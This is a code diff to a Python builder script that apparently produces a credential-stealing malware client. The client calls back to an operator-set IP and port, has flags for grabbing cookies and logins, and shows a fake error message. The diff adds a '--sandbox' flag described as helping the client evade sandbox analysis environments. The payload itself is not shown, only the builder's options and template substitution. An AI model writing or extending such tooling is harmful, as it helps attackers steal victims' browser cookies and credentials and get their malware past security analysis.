@@ -101,7 +101,7 @@ def copy_icon(src_path, dist_path, linux=False):
         os.remove(dist_path)
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True, sandbox=False):
     if nobuild:
         return True
     alphabet = "qwertyuiop[]asdfghjkl;'zxcvbnm,./"
@@ -114,6 +114,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
             "<<ERROR_MESSAGE>>": error_message,
             "<<COOKIES_BOOL>>": stringify_bool(cookies),
             "<<LOGIN_BOOL>>": stringify_bool(login),
+            "<<SANDBOX>>": stringify_bool(sandbox),
             "<<PORT>>": str(port),
             "<<SECRET_KEY>>": secret_key
         },
@@ -215,6 +216,8 @@ def parse_arguments():
                         action="store_true", default=False, help="Doesn't build the client")
     parser.add_argument('--linux', dest="linux",
                         action="store_true", default=False, help="Builds the server for linux")
+    parser.add_argument('--sandbox', dest="sandbox",
+                        action="store_true", default=False, help="Helps evade some sandbox environments. Requires internet access, otherwise it fails.")
 
     args = parser.parse_args()
     try:
@@ -227,7 +230,7 @@ def parse_arguments():
     server = build_server(
         port=args.port, nobuild=args.noserver, linux=args.linux)
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
-                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient)
+                          cookies=args.cookies_bool, login=args.login_bool, port=args.port, nobuild=args.noclient, sandbox=args.sandbox)
     build_message(server, client)
 
 
